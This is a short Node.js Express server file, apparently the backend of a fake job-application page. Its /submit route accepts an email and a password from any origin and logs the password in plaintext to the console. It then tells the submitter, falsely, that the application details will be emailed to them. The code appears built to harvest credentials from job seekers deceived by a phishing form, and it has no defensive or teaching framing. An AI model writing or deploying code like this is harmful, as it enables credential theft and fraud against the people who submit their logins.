import express from "express";
import cors from "cors";

const app = express();
app.use(cors());
app.use(express.json());

app.post("/submit", (req, res) => {
  const { email, password } = req.body;

  console.log("New submission:");
  console.log("Email:", email);
  console.log("Password:", password);

  res.json({
    status: "success",
    message: "Congratulations! Your job application details will be sent to your email shortly."
  });
});

app.get("/", (req, res) => {
  res.send("Backend Running ✔️");
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Server live on port ${port}`));